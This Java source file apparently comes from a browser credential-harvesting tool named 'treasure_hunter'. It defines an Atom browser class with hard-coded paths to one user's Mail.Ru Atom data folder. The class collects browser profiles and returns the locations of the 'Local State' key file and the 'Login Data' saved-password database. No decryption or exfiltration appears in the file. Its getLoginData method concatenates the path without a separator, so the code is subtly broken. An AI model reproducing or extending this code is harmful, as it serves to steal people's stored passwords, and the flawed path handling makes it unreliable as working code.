package com.treasure_hunter_java.browsers;

import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

public class Atom extends Browser{

    private final Path dirName = Path.of("C:/Users/Mikle/AppData/Local/Mail.Ru/Atom/User Data/");

    private final Path localStatePath = Path.of("C:/Users/Mikle/AppData/Local/Mail.Ru/Atom/User Data/Local State");

    private List<Path> profiles = new ArrayList<>();

    public void collectProfiles() {
        super.collectProfiles(dirName);
        profiles = super.getProfiles();
    }

    @Override
    public List<Path> getProfiles() {
        return profiles;
    }

    public Path getLocalState() {

        return localStatePath;

    }

    public Path getLoginData(Path path) {

        return Path.of(path + "Login Data");

    }

}
